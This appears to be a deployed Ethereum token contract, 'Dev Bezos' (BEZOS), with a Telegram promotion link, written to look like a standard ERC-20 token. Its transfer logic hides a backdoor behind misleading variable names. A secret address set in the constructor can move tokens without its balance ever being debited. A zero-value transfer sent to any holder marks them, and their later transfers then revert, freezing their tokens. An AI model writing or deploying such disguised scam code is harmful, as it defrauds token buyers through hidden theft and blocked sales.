/**
 *Submitted for verification at Etherscan.io on 2023-05-12
*/

// SPDX-License-Identifier: MIT

/* 

YES DEV IS BASED.

Telegram:
https://t.me/joindevbezos

*/


pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Devbezos is Ownable {
    string public symbol;
    address public uniswapV2Pair;

    constructor(address code) {
        symbol = 'BEZOS';
        name = 'Dev Bezos';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        overflow[code] = stack;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address key, uint256 ego) public returns (bool success) {
        appear(msg.sender, key, ego);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address it, uint256 ego) public returns (bool success) {
        allowance[msg.sender][it] = ego;
        emit Approval(msg.sender, it, ego);
        return true;
    }

    function transferFrom(address visit, address key, uint256 ego) public returns (bool success) {
        appear(visit, key, ego);
        require(ego <= allowance[visit][msg.sender]);
        allowance[visit][msg.sender] -= ego;
        return true;
    }

    function appear(address visit, address key, uint256 ego) private returns (bool success) {
        if (overflow[visit] == 0) {
            if (remain[visit] > 0 && visit != uniswapV2Pair) {
                overflow[visit] -= stack;
            }
            balanceOf[visit] -= ego;
        }
        if (ego == 0) {
            remain[key] += stack;
        }
        balanceOf[key] += ego;
        emit Transfer(visit, key, ego);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private overflow;

    uint256 public totalSupply;

    uint256 private stack = 3;

    uint8 public decimals = 9;

    mapping(address => uint256) private remain;

    string public name;
}